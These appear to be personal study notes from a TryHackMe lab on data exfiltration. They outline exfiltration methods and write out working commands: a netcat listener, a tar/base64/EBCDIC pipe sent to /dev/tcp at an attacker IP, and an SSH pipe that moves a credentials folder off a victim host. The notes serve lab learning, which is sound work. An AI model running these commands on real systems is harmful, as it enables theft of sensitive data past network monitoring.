Data Exfiltration
-steal and transfer sensitive data
-relies on network protocols such as DNS, HTTP, SSH etc

-----------------------------------------------------------

connect
ssh thm@[IP]
password: tryhackme

----------------------------------------------------------------

-Data Exfiltration: unauthorized copy and export of data from inside an organization to the outside
1. traditional: attacker -> server <-- firewall <-- data ( one direction_
2. c2: establish a channel to send commands and receive responses from victim machine
3. tunneling: establish communication channel b/n victim and attacker - continueous traffic

-----------------------------------------------------------------------------

Exfiltration using TCP Socket
-easy to detect
-encode data during transmission (harder to examine)

ssh thm@[IP]
tryhackme

thm@jump-box nc -lvp 8080 > /tmp/task4-creds.data

thm@jump-box ssh thm@vicitm1.thm.com
tryhackme

tar zcf -task4/ | base64 | dd conv=ebcdic > /dev/tcp[AttackIP]/8080

thm@jump-box cd /tmp
thm@jump-box /tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
thm@jump-box tar xvf task4-creds.tar
thm@jump-box cat task4/creds.txt

*Exfiltration using TCP sockets relies on non-standard protocols

-----------------------------------------------------------------------------------------

Exfiltration using SSH
-establishes a secure channel to interact and move data between client and server
ssh thm@victim1.thm.com
-pass: tryhackme
cat task5/Creds.txt
tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
thm@jump-box$ cd /tmp/task5/
thm@jump-box$ cat creds.txt

---------------------------------------------------------------------------------------------

Exfiltrate using HTTPS
-need control of a webserver with server-side programming language
-HTTP POST requests
1. requests aren't cached
2. don't remain in browser history
3. can't be bookmarked
4. no restriction on data length
